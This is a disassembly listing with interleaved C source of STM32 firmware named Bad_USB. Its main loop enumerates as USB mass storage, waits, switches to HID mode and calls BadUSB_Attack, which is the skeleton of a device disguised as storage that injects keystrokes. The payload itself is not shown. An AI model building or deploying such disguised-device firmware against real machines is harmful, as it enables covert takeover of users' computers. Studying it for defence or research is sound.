
Bad_USB.elf:     file format elf32-littlearm

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .isr_vector   0000018c  08000000  08000000  00010000  2**0
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  1 .text         0000ced4  0800018c  0800018c  0001018c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  2 .rodata       000001a4  0800d060  0800d060  0001d060  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  3 .ARM.extab    00000000  0800d204  0800d204  00020240  2**0
                  CONTENTS
  4 .ARM          00000008  0800d204  0800d204  0001d204  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  5 .preinit_array 00000000  0800d20c  0800d20c  00020240  2**0
                  CONTENTS, ALLOC, LOAD, DATA
  6 .init_array   00000004  0800d20c  0800d20c  0001d20c  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  7 .fini_array   00000004  0800d210  0800d210  0001d210  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  8 .data         00000240  20000000  0800d214  00020000  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  9 .bss          00001cd4  20000240  0800d454  00020240  2**2
                  ALLOC
 10 ._user_heap_stack 00001604  20001f14  0800d454  00021f14  2**0
                  ALLOC
 11 .ARM.attributes 00000030  00000000  00000000  00020240  2**0
                  CONTENTS, READONLY
 12 .comment      00000043  00000000  00000000  00020270  2**0
                  CONTENTS, READONLY
 13 .debug_info   00020a76  00000000  00000000  000202b3  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 14 .debug_abbrev 00005371  00000000  00000000  00040d29  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 15 .debug_aranges 00001b30  00000000  00000000  000460a0  2**3
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 16 .debug_rnglists 000014c1  00000000  00000000  00047bd0  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 17 .debug_macro  000265ec  00000000  00000000  00049091  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 18 .debug_line   00025af1  00000000  00000000  0006f67d  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 19 .debug_str    000d240a  00000000  00000000  0009516e  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 20 .debug_frame  00006f48  00000000  00000000  00167578  2**2
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 21 .debug_line_str 00000049  00000000  00000000  0016e4c0  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS

Disassembly of section .text:

0800018c <__do_global_dtors_aux>:
 800018c:	b510      	push	{r4, lr}
 800018e:	4c05      	ldr	r4, [pc, #20]	; (80001a4 <__do_global_dtors_aux+0x18>)
 8000190:	7823      	ldrb	r3, [r4, #0]
 8000192:	b933      	cbnz	r3, 80001a2 <__do_global_dtors_aux+0x16>
 8000194:	4b04      	ldr	r3, [pc, #16]	; (80001a8 <__do_global_dtors_aux+0x1c>)
 8000196:	b113      	cbz	r3, 800019e <__do_global_dtors_aux+0x12>
 8000198:	4804      	ldr	r0, [pc, #16]	; (80001ac <__do_global_dtors_aux+0x20>)
 800019a:	f3af 8000 	nop.w
 800019e:	2301      	movs	r3, #1
 80001a0:	7023      	strb	r3, [r4, #0]
 80001a2:	bd10      	pop	{r4, pc}
 80001a4:	20000240 	.word	0x20000240
 80001a8:	00000000 	.word	0x00000000
 80001ac:	0800d048 	.word	0x0800d048

080001b0 <frame_dummy>:
 80001b0:	b508      	push	{r3, lr}
 80001b2:	4b03      	ldr	r3, [pc, #12]	; (80001c0 <frame_dummy+0x10>)
 80001b4:	b11b      	cbz	r3, 80001be <frame_dummy+0xe>
 80001b6:	4903      	ldr	r1, [pc, #12]	; (80001c4 <frame_dummy+0x14>)
 80001b8:	4803      	ldr	r0, [pc, #12]	; (80001c8 <frame_dummy+0x18>)
 80001ba:	f3af 8000 	nop.w
 80001be:	bd08      	pop	{r3, pc}
 80001c0:	00000000 	.word	0x00000000
 80001c4:	20000244 	.word	0x20000244
 80001c8:	0800d048 	.word	0x0800d048

080001cc <strlen>:
 80001cc:	4603      	mov	r3, r0
 80001ce:	f813 2b01 	ldrb.w	r2, [r3], #1
 80001d2:	2a00      	cmp	r2, #0
 80001d4:	d1fb      	bne.n	80001ce <strlen+0x2>
 80001d6:	1a18      	subs	r0, r3, r0
 80001d8:	3801      	subs	r0, #1
 80001da:	4770      	bx	lr

080001dc <__aeabi_uldivmod>:
 80001dc:	b953      	cbnz	r3, 80001f4 <__aeabi_uldivmod+0x18>
 80001de:	b94a      	cbnz	r2, 80001f4 <__aeabi_uldivmod+0x18>
 80001e0:	2900      	cmp	r1, #0
 80001e2:	bf08      	it	eq
 80001e4:	2800      	cmpeq	r0, #0
 80001e6:	bf1c      	itt	ne
 80001e8:	f04f 31ff 	movne.w	r1, #4294967295
 80001ec:	f04f 30ff 	movne.w	r0, #4294967295
 80001f0:	f000 b970 	b.w	80004d4 <__aeabi_idiv0>
 80001f4:	f1ad 0c08 	sub.w	ip, sp, #8
 80001f8:	e96d ce04 	strd	ip, lr, [sp, #-16]!
 80001fc:	f000 f806 	bl	800020c <__udivmoddi4>
 8000200:	f8dd e004 	ldr.w	lr, [sp, #4]
 8000204:	e9dd 2302 	ldrd	r2, r3, [sp, #8]
 8000208:	b004      	add	sp, #16
 800020a:	4770      	bx	lr

0800020c <__udivmoddi4>:
 800020c:	e92d 47f0 	stmdb	sp!, {r4, r5, r6, r7, r8, r9, sl, lr}
 8000210:	9e08      	ldr	r6, [sp, #32]
 8000212:	460d      	mov	r5, r1
 8000214:	4604      	mov	r4, r0
 8000216:	460f      	mov	r7, r1
 8000218:	2b00      	cmp	r3, #0
 800021a:	d14a      	bne.n	80002b2 <__udivmoddi4+0xa6>
 800021c:	428a      	cmp	r2, r1
 800021e:	4694      	mov	ip, r2
 8000220:	d965      	bls.n	80002ee <__udivmoddi4+0xe2>
 8000222:	fab2 f382 	clz	r3, r2
 8000226:	b143      	cbz	r3, 800023a <__udivmoddi4+0x2e>
 8000228:	fa02 fc03 	lsl.w	ip, r2, r3
 800022c:	f1c3 0220 	rsb	r2, r3, #32
 8000230:	409f      	lsls	r7, r3
 8000232:	fa20 f202 	lsr.w	r2, r0, r2
 8000236:	4317      	orrs	r7, r2
 8000238:	409c      	lsls	r4, r3
 800023a:	ea4f 4e1c 	mov.w	lr, ip, lsr #16
 800023e:	fa1f f58c 	uxth.w	r5, ip
 8000242:	fbb7 f1fe 	udiv	r1, r7, lr
 8000246:	0c22      	lsrs	r2, r4, #16
 8000248:	fb0e 7711 	mls	r7, lr, r1, r7
 800024c:	ea42 4207 	orr.w	r2, r2, r7, lsl #16
 8000250:	fb01 f005 	mul.w	r0, r1, r5
 8000254:	4290      	cmp	r0, r2
 8000256:	d90a      	bls.n	800026e <__udivmoddi4+0x62>
 8000258:	eb1c 0202 	adds.w	r2, ip, r2
 800025c:	f101 37ff 	add.w	r7, r1, #4294967295
 8000260:	f080 811c 	bcs.w	800049c <__udivmoddi4+0x290>
 8000264:	4290      	cmp	r0, r2
 8000266:	f240 8119 	bls.w	800049c <__udivmoddi4+0x290>
 800026a:	3902      	subs	r1, #2
 800026c:	4462      	add	r2, ip
 800026e:	1a12      	subs	r2, r2, r0
 8000270:	b2a4      	uxth	r4, r4
 8000272:	fbb2 f0fe 	udiv	r0, r2, lr
 8000276:	fb0e 2210 	mls	r2, lr, r0, r2
 800027a:	ea44 4402 	orr.w	r4, r4, r2, lsl #16
 800027e:	fb00 f505 	mul.w	r5, r0, r5
 8000282:	42a5      	cmp	r5, r4
 8000284:	d90a      	bls.n	800029c <__udivmoddi4+0x90>
 8000286:	eb1c 0404 	adds.w	r4, ip, r4
 800028a:	f100 32ff 	add.w	r2, r0, #4294967295
 800028e:	f080 8107 	bcs.w	80004a0 <__udivmoddi4+0x294>
 8000292:	42a5      	cmp	r5, r4
 8000294:	f240 8104 	bls.w	80004a0 <__udivmoddi4+0x294>
 8000298:	4464      	add	r4, ip
 800029a:	3802      	subs	r0, #2
 800029c:	ea40 4001 	orr.w	r0, r0, r1, lsl #16
 80002a0:	1b64      	subs	r4, r4, r5
 80002a2:	2100      	movs	r1, #0
 80002a4:	b11e      	cbz	r6, 80002ae <__udivmoddi4+0xa2>
 80002a6:	40dc      	lsrs	r4, r3
 80002a8:	2300      	movs	r3, #0
 80002aa:	e9c6 4300 	strd	r4, r3, [r6]
 80002ae:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 80002b2:	428b      	cmp	r3, r1
 80002b4:	d908      	bls.n	80002c8 <__udivmoddi4+0xbc>
 80002b6:	2e00      	cmp	r6, #0
 80002b8:	f000 80ed 	beq.w	8000496 <__udivmoddi4+0x28a>
 80002bc:	2100      	movs	r1, #0
 80002be:	e9c6 0500 	strd	r0, r5, [r6]
 80002c2:	4608      	mov	r0, r1
 80002c4:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 80002c8:	fab3 f183 	clz	r1, r3
 80002cc:	2900      	cmp	r1, #0
 80002ce:	d149      	bne.n	8000364 <__udivmoddi4+0x158>
 80002d0:	42ab      	cmp	r3, r5
 80002d2:	d302      	bcc.n	80002da <__udivmoddi4+0xce>
 80002d4:	4282      	cmp	r2, r0
 80002d6:	f200 80f8 	bhi.w	80004ca <__udivmoddi4+0x2be>
 80002da:	1a84      	subs	r4, r0, r2
 80002dc:	eb65 0203 	sbc.w	r2, r5, r3
 80002e0:	2001      	movs	r0, #1
 80002e2:	4617      	mov	r7, r2
 80002e4:	2e00      	cmp	r6, #0
 80002e6:	d0e2      	beq.n	80002ae <__udivmoddi4+0xa2>
 80002e8:	e9c6 4700 	strd	r4, r7, [r6]
 80002ec:	e7df      	b.n	80002ae <__udivmoddi4+0xa2>
 80002ee:	b902      	cbnz	r2, 80002f2 <__udivmoddi4+0xe6>
 80002f0:	deff      	udf	#255	; 0xff
 80002f2:	fab2 f382 	clz	r3, r2
 80002f6:	2b00      	cmp	r3, #0
 80002f8:	f040 8090 	bne.w	800041c <__udivmoddi4+0x210>
 80002fc:	1a8a      	subs	r2, r1, r2
 80002fe:	ea4f 471c 	mov.w	r7, ip, lsr #16
 8000302:	fa1f fe8c 	uxth.w	lr, ip
 8000306:	2101      	movs	r1, #1
 8000308:	fbb2 f5f7 	udiv	r5, r2, r7
 800030c:	fb07 2015 	mls	r0, r7, r5, r2
 8000310:	0c22      	lsrs	r2, r4, #16
 8000312:	ea42 4200 	orr.w	r2, r2, r0, lsl #16
 8000316:	fb0e f005 	mul.w	r0, lr, r5
 800031a:	4290      	cmp	r0, r2
 800031c:	d908      	bls.n	8000330 <__udivmoddi4+0x124>
 800031e:	eb1c 0202 	adds.w	r2, ip, r2
 8000322:	f105 38ff 	add.w	r8, r5, #4294967295
 8000326:	d202      	bcs.n	800032e <__udivmoddi4+0x122>
 8000328:	4290      	cmp	r0, r2
 800032a:	f200 80cb 	bhi.w	80004c4 <__udivmoddi4+0x2b8>
 800032e:	4645      	mov	r5, r8
 8000330:	1a12      	subs	r2, r2, r0
 8000332:	b2a4      	uxth	r4, r4
 8000334:	fbb2 f0f7 	udiv	r0, r2, r7
 8000338:	fb07 2210 	mls	r2, r7, r0, r2
 800033c:	ea44 4402 	orr.w	r4, r4, r2, lsl #16
 8000340:	fb0e fe00 	mul.w	lr, lr, r0
 8000344:	45a6      	cmp	lr, r4
 8000346:	d908      	bls.n	800035a <__udivmoddi4+0x14e>
 8000348:	eb1c 0404 	adds.w	r4, ip, r4
 800034c:	f100 32ff 	add.w	r2, r0, #4294967295
 8000350:	d202      	bcs.n	8000358 <__udivmoddi4+0x14c>
 8000352:	45a6      	cmp	lr, r4
 8000354:	f200 80bb 	bhi.w	80004ce <__udivmoddi4+0x2c2>
 8000358:	4610      	mov	r0, r2
 800035a:	eba4 040e 	sub.w	r4, r4, lr
 800035e:	ea40 4005 	orr.w	r0, r0, r5, lsl #16
 8000362:	e79f      	b.n	80002a4 <__udivmoddi4+0x98>
 8000364:	f1c1 0720 	rsb	r7, r1, #32
 8000368:	408b      	lsls	r3, r1
 800036a:	fa22 fc07 	lsr.w	ip, r2, r7
 800036e:	ea4c 0c03 	orr.w	ip, ip, r3
 8000372:	fa05 f401 	lsl.w	r4, r5, r1
 8000376:	fa20 f307 	lsr.w	r3, r0, r7
 800037a:	40fd      	lsrs	r5, r7
 800037c:	ea4f 491c 	mov.w	r9, ip, lsr #16
 8000380:	4323      	orrs	r3, r4
 8000382:	fbb5 f8f9 	udiv	r8, r5, r9
 8000386:	fa1f fe8c 	uxth.w	lr, ip
 800038a:	fb09 5518 	mls	r5, r9, r8, r5
 800038e:	0c1c      	lsrs	r4, r3, #16
 8000390:	ea44 4405 	orr.w	r4, r4, r5, lsl #16
 8000394:	fb08 f50e 	mul.w	r5, r8, lr
 8000398:	42a5      	cmp	r5, r4
 800039a:	fa02 f201 	lsl.w	r2, r2, r1
 800039e:	fa00 f001 	lsl.w	r0, r0, r1
 80003a2:	d90b      	bls.n	80003bc <__udivmoddi4+0x1b0>
 80003a4:	eb1c 0404 	adds.w	r4, ip, r4
 80003a8:	f108 3aff 	add.w	sl, r8, #4294967295
 80003ac:	f080 8088 	bcs.w	80004c0 <__udivmoddi4+0x2b4>
 80003b0:	42a5      	cmp	r5, r4
 80003b2:	f240 8085 	bls.w	80004c0 <__udivmoddi4+0x2b4>
 80003b6:	f1a8 0802 	sub.w	r8, r8, #2
 80003ba:	4464      	add	r4, ip
 80003bc:	1b64      	subs	r4, r4, r5
 80003be:	b29d      	uxth	r5, r3
 80003c0:	fbb4 f3f9 	udiv	r3, r4, r9
 80003c4:	fb09 4413 	mls	r4, r9, r3, r4
 80003c8:	ea45 4404 	orr.w	r4, r5, r4, lsl #16
 80003cc:	fb03 fe0e 	mul.w	lr, r3, lr
 80003d0:	45a6      	cmp	lr, r4
 80003d2:	d908      	bls.n	80003e6 <__udivmoddi4+0x1da>
 80003d4:	eb1c 0404 	adds.w	r4, ip, r4
 80003d8:	f103 35ff 	add.w	r5, r3, #4294967295
 80003dc:	d26c      	bcs.n	80004b8 <__udivmoddi4+0x2ac>
 80003de:	45a6      	cmp	lr, r4
 80003e0:	d96a      	bls.n	80004b8 <__udivmoddi4+0x2ac>
 80003e2:	3b02      	subs	r3, #2
 80003e4:	4464      	add	r4, ip
 80003e6:	ea43 4308 	orr.w	r3, r3, r8, lsl #16
 80003ea:	fba3 9502 	umull	r9, r5, r3, r2
 80003ee:	eba4 040e 	sub.w	r4, r4, lr
 80003f2:	42ac      	cmp	r4, r5
 80003f4:	46c8      	mov	r8, r9
 80003f6:	46ae      	mov	lr, r5
 80003f8:	d356      	bcc.n	80004a8 <__udivmoddi4+0x29c>
 80003fa:	d053      	beq.n	80004a4 <__udivmoddi4+0x298>
 80003fc:	b156      	cbz	r6, 8000414 <__udivmoddi4+0x208>
 80003fe:	ebb0 0208 	subs.w	r2, r0, r8
 8000402:	eb64 040e 	sbc.w	r4, r4, lr
 8000406:	fa04 f707 	lsl.w	r7, r4, r7
 800040a:	40ca      	lsrs	r2, r1
 800040c:	40cc      	lsrs	r4, r1
 800040e:	4317      	orrs	r7, r2
 8000410:	e9c6 7400 	strd	r7, r4, [r6]
 8000414:	4618      	mov	r0, r3
 8000416:	2100      	movs	r1, #0
 8000418:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 800041c:	f1c3 0120 	rsb	r1, r3, #32
 8000420:	fa02 fc03 	lsl.w	ip, r2, r3
 8000424:	fa20 f201 	lsr.w	r2, r0, r1
 8000428:	fa25 f101 	lsr.w	r1, r5, r1
 800042c:	409d      	lsls	r5, r3
 800042e:	432a      	orrs	r2, r5
 8000430:	ea4f 471c 	mov.w	r7, ip, lsr #16
 8000434:	fa1f fe8c 	uxth.w	lr, ip
 8000438:	fbb1 f0f7 	udiv	r0, r1, r7
 800043c:	fb07 1510 	mls	r5, r7, r0, r1
 8000440:	0c11      	lsrs	r1, r2, #16
 8000442:	ea41 4105 	orr.w	r1, r1, r5, lsl #16
 8000446:	fb00 f50e 	mul.w	r5, r0, lr
 800044a:	428d      	cmp	r5, r1
 800044c:	fa04 f403 	lsl.w	r4, r4, r3
 8000450:	d908      	bls.n	8000464 <__udivmoddi4+0x258>
 8000452:	eb1c 0101 	adds.w	r1, ip, r1
 8000456:	f100 38ff 	add.w	r8, r0, #4294967295
 800045a:	d22f      	bcs.n	80004bc <__udivmoddi4+0x2b0>
 800045c:	428d      	cmp	r5, r1
 800045e:	d92d      	bls.n	80004bc <__udivmoddi4+0x2b0>
 8000460:	3802      	subs	r0, #2
 8000462:	4461      	add	r1, ip
 8000464:	1b49      	subs	r1, r1, r5
 8000466:	b292      	uxth	r2, r2
 8000468:	fbb1 f5f7 	udiv	r5, r1, r7
 800046c:	fb07 1115 	mls	r1, r7, r5, r1
 8000470:	ea42 4201 	orr.w	r2, r2, r1, lsl #16
 8000474:	fb05 f10e 	mul.w	r1, r5, lr
 8000478:	4291      	cmp	r1, r2
 800047a:	d908      	bls.n	800048e <__udivmoddi4+0x282>
 800047c:	eb1c 0202 	adds.w	r2, ip, r2
 8000480:	f105 38ff 	add.w	r8, r5, #4294967295
 8000484:	d216      	bcs.n	80004b4 <__udivmoddi4+0x2a8>
 8000486:	4291      	cmp	r1, r2
 8000488:	d914      	bls.n	80004b4 <__udivmoddi4+0x2a8>
 800048a:	3d02      	subs	r5, #2
 800048c:	4462      	add	r2, ip
 800048e:	1a52      	subs	r2, r2, r1
 8000490:	ea45 4100 	orr.w	r1, r5, r0, lsl #16
 8000494:	e738      	b.n	8000308 <__udivmoddi4+0xfc>
 8000496:	4631      	mov	r1, r6
 8000498:	4630      	mov	r0, r6
 800049a:	e708      	b.n	80002ae <__udivmoddi4+0xa2>
 800049c:	4639      	mov	r1, r7
 800049e:	e6e6      	b.n	800026e <__udivmoddi4+0x62>
 80004a0:	4610      	mov	r0, r2
 80004a2:	e6fb      	b.n	800029c <__udivmoddi4+0x90>
 80004a4:	4548      	cmp	r0, r9
 80004a6:	d2a9      	bcs.n	80003fc <__udivmoddi4+0x1f0>
 80004a8:	ebb9 0802 	subs.w	r8, r9, r2
 80004ac:	eb65 0e0c 	sbc.w	lr, r5, ip
 80004b0:	3b01      	subs	r3, #1
 80004b2:	e7a3      	b.n	80003fc <__udivmoddi4+0x1f0>
 80004b4:	4645      	mov	r5, r8
 80004b6:	e7ea      	b.n	800048e <__udivmoddi4+0x282>
 80004b8:	462b      	mov	r3, r5
 80004ba:	e794      	b.n	80003e6 <__udivmoddi4+0x1da>
 80004bc:	4640      	mov	r0, r8
 80004be:	e7d1      	b.n	8000464 <__udivmoddi4+0x258>
 80004c0:	46d0      	mov	r8, sl
 80004c2:	e77b      	b.n	80003bc <__udivmoddi4+0x1b0>
 80004c4:	3d02      	subs	r5, #2
 80004c6:	4462      	add	r2, ip
 80004c8:	e732      	b.n	8000330 <__udivmoddi4+0x124>
 80004ca:	4608      	mov	r0, r1
 80004cc:	e70a      	b.n	80002e4 <__udivmoddi4+0xd8>
 80004ce:	4464      	add	r4, ip
 80004d0:	3802      	subs	r0, #2
 80004d2:	e742      	b.n	800035a <__udivmoddi4+0x14e>

080004d4 <__aeabi_idiv0>:
 80004d4:	4770      	bx	lr
 80004d6:	bf00      	nop

080004d8 <MX_GPIO_Init>:
        * Output
        * EVENT_OUT
        * EXTI
*/
void MX_GPIO_Init(void)
{
 80004d8:	b580      	push	{r7, lr}
 80004da:	b088      	sub	sp, #32
 80004dc:	af00      	add	r7, sp, #0

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 80004de:	f107 030c 	add.w	r3, r7, #12
 80004e2:	2200      	movs	r2, #0
 80004e4:	601a      	str	r2, [r3, #0]
 80004e6:	605a      	str	r2, [r3, #4]
 80004e8:	609a      	str	r2, [r3, #8]
 80004ea:	60da      	str	r2, [r3, #12]
 80004ec:	611a      	str	r2, [r3, #16]

  /* GPIO Ports Clock Enable */
  __HAL_RCC_GPIOC_CLK_ENABLE();
 80004ee:	4b24      	ldr	r3, [pc, #144]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004f0:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80004f2:	4a23      	ldr	r2, [pc, #140]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004f4:	f043 0304 	orr.w	r3, r3, #4
 80004f8:	64d3      	str	r3, [r2, #76]	; 0x4c
 80004fa:	4b21      	ldr	r3, [pc, #132]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004fc:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80004fe:	f003 0304 	and.w	r3, r3, #4
 8000502:	60bb      	str	r3, [r7, #8]
 8000504:	68bb      	ldr	r3, [r7, #8]
  __HAL_RCC_GPIOA_CLK_ENABLE();
 8000506:	4b1e      	ldr	r3, [pc, #120]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000508:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 800050a:	4a1d      	ldr	r2, [pc, #116]	; (8000580 <MX_GPIO_Init+0xa8>)
 800050c:	f043 0301 	orr.w	r3, r3, #1
 8000510:	64d3      	str	r3, [r2, #76]	; 0x4c
 8000512:	4b1b      	ldr	r3, [pc, #108]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000514:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000516:	f003 0301 	and.w	r3, r3, #1
 800051a:	607b      	str	r3, [r7, #4]
 800051c:	687b      	ldr	r3, [r7, #4]
  __HAL_RCC_GPIOB_CLK_ENABLE();
 800051e:	4b18      	ldr	r3, [pc, #96]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000520:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000522:	4a17      	ldr	r2, [pc, #92]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000524:	f043 0302 	orr.w	r3, r3, #2
 8000528:	64d3      	str	r3, [r2, #76]	; 0x4c
 800052a:	4b15      	ldr	r3, [pc, #84]	; (8000580 <MX_GPIO_Init+0xa8>)
 800052c:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 800052e:	f003 0302 	and.w	r3, r3, #2
 8000532:	603b      	str	r3, [r7, #0]
 8000534:	683b      	ldr	r3, [r7, #0]

  /*Configure GPIO pin Output Level */
  HAL_GPIO_WritePin(GPIOB, SPI1_CS_Pin|LD3_Pin, GPIO_PIN_SET);
 8000536:	2201      	movs	r2, #1
 8000538:	2109      	movs	r1, #9
 800053a:	4812      	ldr	r0, [pc, #72]	; (8000584 <MX_GPIO_Init+0xac>)
 800053c:	f001 fb58 	bl	8001bf0 <HAL_GPIO_WritePin>

  /*Configure GPIO pin : PtPin */
  GPIO_InitStruct.Pin = SPI1_CS_Pin;
 8000540:	2301      	movs	r3, #1
 8000542:	60fb      	str	r3, [r7, #12]
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
 8000544:	2301      	movs	r3, #1
 8000546:	613b      	str	r3, [r7, #16]
  GPIO_InitStruct.Pull = GPIO_PULLUP;
 8000548:	2301      	movs	r3, #1
 800054a:	617b      	str	r3, [r7, #20]
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
 800054c:	2300      	movs	r3, #0
 800054e:	61bb      	str	r3, [r7, #24]
  HAL_GPIO_Init(SPI1_CS_GPIO_Port, &GPIO_InitStruct);
 8000550:	f107 030c 	add.w	r3, r7, #12
 8000554:	4619      	mov	r1, r3
 8000556:	480b      	ldr	r0, [pc, #44]	; (8000584 <MX_GPIO_Init+0xac>)
 8000558:	f001 f9e0 	bl	800191c <HAL_GPIO_Init>

  /*Configure GPIO pin : PtPin */
  GPIO_InitStruct.Pin = LD3_Pin;
 800055c:	2308      	movs	r3, #8
 800055e:	60fb      	str	r3, [r7, #12]
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
 8000560:	2301      	movs	r3, #1
 8000562:	613b      	str	r3, [r7, #16]
  GPIO_InitStruct.Pull = GPIO_NOPULL;
 8000564:	2300      	movs	r3, #0
 8000566:	617b      	str	r3, [r7, #20]
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
 8000568:	2300      	movs	r3, #0
 800056a:	61bb      	str	r3, [r7, #24]
  HAL_GPIO_Init(LD3_GPIO_Port, &GPIO_InitStruct);
 800056c:	f107 030c 	add.w	r3, r7, #12
 8000570:	4619      	mov	r1, r3
 8000572:	4804      	ldr	r0, [pc, #16]	; (8000584 <MX_GPIO_Init+0xac>)
 8000574:	f001 f9d2 	bl	800191c <HAL_GPIO_Init>

}
 8000578:	bf00      	nop
 800057a:	3720      	adds	r7, #32
 800057c:	46bd      	mov	sp, r7
 800057e:	bd80      	pop	{r7, pc}
 8000580:	40021000 	.word	0x40021000
 8000584:	48000400 	.word	0x48000400

08000588 <main>:
/**
  * @brief  The application entry point.
  * @retval int
  */
int main(void)
{
 8000588:	b580      	push	{r7, lr}
 800058a:	b082      	sub	sp, #8
 800058c:	af00      	add	r7, sp, #0
  /* USER CODE END 1 */

  /* MCU Configuration--------------------------------------------------------*/

  /* Reset of all peripherals, Initializes the Flash interface and the Systick. */
  HAL_Init();
 800058e:	f000 fda2 	bl	80010d6 <HAL_Init>
  /* USER CODE BEGIN Init */

  /* USER CODE END Init */

  /* Configure the system clock */
  SystemClock_Config();
 8000592:	f000 f843 	bl	800061c <SystemClock_Config>
  /* USER CODE BEGIN SysInit */

  /* USER CODE END SysInit */

  /* Initialize all configured peripherals */
  MX_GPIO_Init();
 8000596:	f7ff ff9f 	bl	80004d8 <MX_GPIO_Init>
  MX_USART2_UART_Init();
 800059a:	f000 fcd9 	bl	8000f50 <MX_USART2_UART_Init>
  MX_SPI1_Init();
 800059e:	f000 fb71 	bl	8000c84 <MX_SPI1_Init>
  /* USER CODE BEGIN 2 */
  int flag = 0;
 80005a2:	2300      	movs	r3, #0
 80005a4:	607b      	str	r3, [r7, #4]
  isMSC = 1;
 80005a6:	4b19      	ldr	r3, [pc, #100]	; (800060c <main+0x84>)
 80005a8:	2201      	movs	r2, #1
 80005aa:	601a      	str	r2, [r3, #0]
  uint32_t Flash_Busy;
  MX_USB_DEVICE_Init_MSC();
 80005ac:	f00b ff0a 	bl	800c3c4 <MX_USB_DEVICE_Init_MSC>

  memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80005b0:	220f      	movs	r2, #15
 80005b2:	2100      	movs	r1, #0
 80005b4:	4816      	ldr	r0, [pc, #88]	; (8000610 <main+0x88>)
 80005b6:	f00c fd0d 	bl	800cfd4 <memset>

  flag = 1;
 80005ba:	2301      	movs	r3, #1
 80005bc:	607b      	str	r3, [r7, #4]
  /* USER CODE END 2 */

  /* Infinite loop */
  /* USER CODE BEGIN WHILE */
  while(1){
	  InterruptTrap(&InterruptFlag);
 80005be:	4815      	ldr	r0, [pc, #84]	; (8000614 <main+0x8c>)
 80005c0:	f000 fa50 	bl	8000a64 <InterruptTrap>
	  Flash_Busy = __HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY);
 80005c4:	4b14      	ldr	r3, [pc, #80]	; (8000618 <main+0x90>)
 80005c6:	691b      	ldr	r3, [r3, #16]
 80005c8:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 80005cc:	2b00      	cmp	r3, #0
 80005ce:	bf14      	ite	ne
 80005d0:	2301      	movne	r3, #1
 80005d2:	2300      	moveq	r3, #0
 80005d4:	b2db      	uxtb	r3, r3
 80005d6:	603b      	str	r3, [r7, #0]

	  if(flag == 1){
 80005d8:	687b      	ldr	r3, [r7, #4]
 80005da:	2b01      	cmp	r3, #1
 80005dc:	d1ef      	bne.n	80005be <main+0x36>
		  HAL_Delay(10000);//random slot to switch HID
 80005de:	f242 7010 	movw	r0, #10000	; 0x2710
 80005e2:	f000 fded 	bl	80011c0 <HAL_Delay>
		  while(1){
			  if(!Flash_Busy){
 80005e6:	683b      	ldr	r3, [r7, #0]
 80005e8:	2b00      	cmp	r3, #0
 80005ea:	d1fc      	bne.n	80005e6 <main+0x5e>
				  SwitchToHID();
 80005ec:	f000 f88e 	bl	800070c <SwitchToHID>
				  HAL_Delay(1000); //test Device Manager linux 2000
 80005f0:	f44f 707a 	mov.w	r0, #1000	; 0x3e8
 80005f4:	f000 fde4 	bl	80011c0 <HAL_Delay>
				  //Attack begin
				  BadUSB_Attack(0);
 80005f8:	2000      	movs	r0, #0
 80005fa:	f000 fa51 	bl	8000aa0 <BadUSB_Attack>
				  break;
 80005fe:	bf00      	nop
			  }
		  }
		  flag = 0;
 8000600:	2300      	movs	r3, #0
 8000602:	607b      	str	r3, [r7, #4]
		  SwitchToMSC();
 8000604:	f000 f896 	bl	8000734 <SwitchToMSC>
 8000608:	e7d9      	b.n	80005be <main+0x36>
 800060a:	bf00      	nop
 800060c:	20000978 	.word	0x20000978
 8000610:	2000025c 	.word	0x2000025c
 8000614:	20000270 	.word	0x20000270
 8000618:	40022000 	.word	0x40022000

0800061c <SystemClock_Config>:
/**
  * @brief System Clock Configuration
  * @retval None
  */
void SystemClock_Config(void)
{
 800061c:	b580      	push	{r7, lr}
 800061e:	b096      	sub	sp, #88	; 0x58
 8000620:	af00      	add	r7, sp, #0
  RCC_OscInitTypeDef RCC_OscInitStruct = {0};
 8000622:	f107 0314 	add.w	r3, r7, #20
 8000626:	2244      	movs	r2, #68	; 0x44
 8000628:	2100      	movs	r1, #0
 800062a:	4618      	mov	r0, r3
 800062c:	f00c fcd2 	bl	800cfd4 <memset>
  RCC_ClkInitTypeDef RCC_ClkInitStruct = {0};
